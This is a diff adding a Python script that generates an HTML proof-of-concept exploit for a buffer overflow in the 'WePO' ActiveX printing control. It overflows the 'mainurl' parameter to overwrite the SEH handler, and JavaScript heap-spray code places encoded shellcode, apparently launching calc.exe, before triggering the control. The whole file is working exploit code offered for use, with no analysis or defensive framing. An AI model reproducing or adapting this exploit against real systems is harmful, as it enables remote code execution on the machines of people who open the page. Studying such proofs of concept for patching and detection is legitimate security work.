@@ -1,0 +1,92 @@
+malicioushtml = open('WePO-PoC.html','w')
+header = '''
+<html>
+<head><title>WePO Buffer Overflow PoC</title>
+</head>
+<body>
+'''
+malicioushtml.write(header)
+objeto = '''
+<OBJECT
+~ classid="clsid:4CE8026D-5DBF-48C9-B6E9-14A2B1974A3D"
+~
+codebase="http://www.anzio.com/controls30/printwizocx.cab#version=3,0,0,0"
+~ width=0
+~ height=0
+~ align=center
+~ hspace=0
+~ id="botontrigger"
+|
+'''
+malicioushtml.write(objeto)
+craftedparam = '<param name="mainurl" value="'
+craftedparam += 'A' * 0x188 #0x188 padding bytes to fill the buffer
+craftedparam += chr(0xFF) * 4 #indicates the end of SEH Chain
+craftedparam += chr(0x0C) * 4 #overwrite the SEH, new value will be
+0x0C0C0C0C
+craftedparam += '">'
+malicioushtml.write(craftedparam)
+jscode = '''
+~ <param name="caption" value="Rompete">
+~ <param name="Cancel" value="0">
+~ <param name="Default" value="0">
+~ <param name="DragCursor" value="-12">
+~ <param name="DragMode" value="0">
+~ <param name="Enabled" value="-1">
+~ <param name="Font" value="MS Sans Serif">
+~ <param name="Visible" value="-1">
+~ <param name="DoubleBuffered" value="0">
+~ <param name="Cursor" value="0">
+~ <param name="licensecode" value>
+~ <param name="printersetup" value="1">
+~ <param name="printername" value="printer">
+~ <param name="charset" value="UTF-8">
+~ <param name="debug" value="0">
+~ <param name="initfile" value>
+~ <param name="orientation" value>
+~ <param name="duplex" value>
+~ <param name="fontname" value>
+~ <param name="overlay" value>
+~ <param name="bitmap" value>
+~ <param name="preview" value="0">
+~ <param name="faxnum" value>
+~ </OBJECT>
+
+<script>
+~ var shellcode =
+unescape("%u0de8%u0000%u6b00%u7265%u656e%u336c%u2e32%u6c64%u006c%u15ff%u108c%u0040%uf08b%u08e8%u0000%u5700%u6e69%u7845%u6365%u5600%u15ff%u1030%u0040%uec81%u0400%u0000%u016a%u09e8%u0000%u6300%u6c61%u2e63%u7865%u0065%ud0ff%u0ce8%u0000%u4500%u6978%u5074%u6f72%u6563%u7373%u5600%u15ff%u1030%u0040%u006a%ud0ff");
+
+~ var spraySlide = unescape("%u9090%u9090");
+~ var heapSprayToAddress = 0x0c0c0c0c;
+
+~ function getSpraySlide(spraySlide, spraySlideSize)
+~ {
+~ while (spraySlide.length*2<spraySlideSize)
+~ {
+~ spraySlide += spraySlide;
+~ }
+~ spraySlide = spraySlide.substring(0,spraySlideSize/2);
+~ return (spraySlide);
+~ }
+
+~ var heapBlockSize = 0x100000;
+~ var SizeOfHeapDataMoreover = 0x5;
+~ var payLoadSize = (shellcode.length * 2);
+
+~ var spraySlideSize = heapBlockSize - (payLoadSize +
+SizeOfHeapDataMoreover);
+~ var heapBlocks = (heapSprayToAddress+heapBlockSize)/heapBlockSize;
+
+~ var memory = new Array();
+~ spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+
+~ for (i=0;i<heapBlocks;i++)
+~ {
+~ memory[i] = spraySlide + shellcode;
+~ }
+~ document.botontrigger.Click();
+
+</script>
+
+</body>
+</html> 
